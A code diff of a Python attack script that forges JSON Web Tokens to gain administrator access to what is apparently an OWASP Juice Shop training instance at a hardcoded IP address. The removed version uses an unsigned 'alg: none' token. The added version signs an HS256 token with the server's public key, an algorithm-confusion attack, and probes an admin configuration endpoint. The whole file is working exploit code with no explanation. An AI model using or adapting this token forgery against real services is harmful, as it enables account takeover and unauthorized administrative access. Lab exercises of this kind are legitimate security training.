@@ -1,85 +1,81 @@
-import requests
 import base64
 import json
-import logging
-import time
+import hmac
+import hashlib
+import requests
 
-
-class ForgedJWT:
-    def __init__(self, base_url):
-        self.base_url = base_url
+class JWTAttack:
+    def __init__(self):
+        self.base_url = "http://45.76.47.218:3000"
         self.session = requests.Session()
+        self.key = "MIGJAoGBAM3CosR73CBNcJsLv5E90NsFt6qN1uziQ484gbOoule8leXHFbyIzPQRozgEpSpiwhr6d2/c0CfZHEJ3m5tV0klxfjfM7oqjRMURnH/rmBjcETQ7qzIISZQ/iptJ3p7Gi78X5ZMhLNtDkUFU9WaGdiEb+SnC39wjErmJSfmGb7i1AgMBAAE="
 
-    @staticmethod
-    def base64url_encode(data):
-        """Encode en Base64 URL-safe sans padding."""
-        return base64.urlsafe_b64encode(data).decode('utf-8').rstrip("=")
-
-    def forge_jwt(self):
-        """Forge un JWT basé sur une analyse du token légitime."""
-        # En-tête JWT
-        header = {
-            "typ": "JWT",
-            "alg": "none"
-        }
-        encoded_header = self.base64url_encode(json.dumps(header).encode('utf-8'))
-
-        # Payload JWT
+    def forge_token(self):
+        header = {"typ":"JWT","alg":"HS256"}
         payload = {
-            "status": "success",
-            "data": {
-                "id": 1,
-                "username": "",
-                "email": "admin@juice-sh.op",
-                "password": "0192023a7bbd73250516f069df18b500",
-                "role": "admin",
-                "deluxeToken": "",
-                "lastLoginIp": "178.132.107.235",
-                "profileImage": "assets/public/images/uploads/defaultAdmin.png",
-                "totpSecret": "",
-                "isActive": True,
-                "createdAt": "2025-01-17 07:10:54.569 +00:00",
-                "updatedAt": "2025-01-17 11:19:21.537 +00:00",
-                "deletedAt": None
+            "status":"success",
+            "data":{
+                "id":32,
+                "username":"",
+                "email":"rsa_lord@juice-sh.op",
+                "password":"5f4dcc3b5aa765d61d8327deb882cf99",
+                "role":"admin",
+                "deluxeToken":"",
+                "lastLoginIp":"0.0.0.0",
+                "profileImage":"/assets/public/images/uploads/default.svg",
+                "totpSecret":"",
+                "isActive":True,
+                "createdAt":"2025-01-17 11:21:30.307 +00:00",
+                "updatedAt":"2025-01-17 12:22:15.867 +00:00",
+                "deletedAt":None
             },
-            "iat": int(time.time())
-        }
-        encoded_payload = self.base64url_encode(json.dumps(payload).encode('utf-8'))
-
-        # Assemble the JWT without signature
-        forged_jwt = f"{encoded_header}.{encoded_payload}."
-        logging.info(f"JWT forgé: {forged_jwt}")
-        return forged_jwt
-
-    def test_forged_jwt(self, forged_jwt):
-        """Test le JWT forgé pour valider son accès."""
-        url = f"{self.base_url}/rest/user/whoami"
-        headers = {
-            "Authorization": f"Bearer {forged_jwt}",
-            "Content-Type": "application/json"
+            "iat":1737122978
         }
 
-        response = self.session.get(url, headers=headers)
+        print("[*] Creating token with:")
+        print(f"Email: {payload['data']['email']}")
+        print(f"Algorithm: {header['alg']}")
+
+        header_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(',',':')).encode()).rstrip(b'=').decode()
+        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload, separators=(',',':')).encode()).rstrip(b'=').decode()
+        unsigned = f"{header_b64}.{payload_b64}"
+        
+        signature = hmac.new(
+            base64.b64decode(self.key),
+            unsigned.encode(),
+            hashlib.sha256
+        ).digest()
+        signature_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
+        
+        return f"{unsigned}.{signature_b64}"
+
+    def test_admin_access(self, token):
+        headers = {"Authorization": f"Bearer {token}"}
+        cookies = {"token": token}
+        
+        response = self.session.get(
+            f"{self.base_url}/rest/admin/application-configuration", 
+            headers=headers, 
+            cookies=cookies
+        )
+        
         if response.status_code == 200:
-            logging.info(f"Succès sur {url}. Résultat : {response.json()}")
+            print(f"[+] Admin access successful!")
+            print(f"[*] Response: {response.text[:200]}")
             return True
         else:
-            logging.error(f"Échec sur {url}. Statut : {response.status_code}, Réponse : {response.text}")
+            print(f"[-] Admin access failed: {response.status_code}")
             return False
 
-    def execute(self):
-        """Exécute l'attaque JWT."""
-        logging.info("Démarrage de l'attaque Forged JWT...")
-        forged_jwt = self.forge_jwt()
-
-        if self.test_forged_jwt(forged_jwt):
-            logging.info("JWT forgé validé avec succès.")
+    def run_attack(self):
+        print("[*] Starting JWT attack...")
+        token = self.forge_token()
+        print(f"[+] Forged token: {token}")
+        
+        if self.test_admin_access(token):
+            print("[+] Challenge completed successfully!")
         else:
-            logging.error("Le JWT forgé n'est pas accepté par le serveur.")
-
+            print("[-] Challenge failed")
 
 if __name__ == "__main__":
-    logging.basicConfig(level=logging.INFO)
-    base_url = "http://45.76.47.218:3000"
-    attack = ForgedJWT(base_url)
-    attack.execute()
+    JWTAttack().run_attack()
